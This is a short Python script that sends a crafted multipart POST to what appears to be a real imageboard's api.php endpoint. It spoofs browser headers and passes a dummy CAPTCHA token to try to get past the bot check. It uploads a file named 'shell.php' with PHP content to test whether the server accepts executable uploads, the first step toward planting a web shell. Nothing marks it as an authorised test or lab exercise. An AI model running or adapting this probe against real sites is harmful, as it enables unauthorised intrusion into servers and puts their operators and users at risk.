#!/usr/bin/env python3
"""3chan api.php - curl-style with full browser headers + Origin/Referer"""
import urllib.request, uuid

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
      "Accept": "application/json, text/plain, */*",
      "Origin": "http://3chan.net",
      "Referer": "http://3chan.net/",
      "Accept-Language": "en-US,en;q=0.9"}

def upload(filename, content, ctype):
    boundary = uuid.uuid4().hex
    body = b""
    fields = [("action", "post_thread"), ("board", "b"), ("turnstile_token", "x"),
              ("name", "t"), ("subject", ""), ("email", ""), ("comment", "test"),
              ("spoiler", "0")]
    for k, v in fields:
        body += b"--" + boundary.encode() + b"\r\n"
        body += ('Content-Disposition: form-data; name="%s"\r\n\r\n' % k).encode()
        body += v.encode() + b"\r\n"
    body += b"--" + boundary.encode() + b"\r\n"
    body += ('Content-Disposition: form-data; name="image"; filename="%s"\r\n' % filename).encode()
    body += ('Content-Type: %s\r\n\r\n' % ctype).encode()
    body += content + b"\r\n"
    body += b"--" + boundary.encode() + b"--\r\n"
    h = {**UA, "Content-Type": "multipart/form-data; boundary=" + boundary}
    req = urllib.request.Request("http://3chan.net/api.php", data=body, headers=h, method="POST")
    try:
        r = urllib.request.urlopen(req, timeout=15)
        return r.status, r.read(8000).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(8000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, str(ex)[:120]

print("full headers + shell.php:", upload("shell.php", b'<?php echo "TEST"; ?>', "application/x-php"), flush=True)
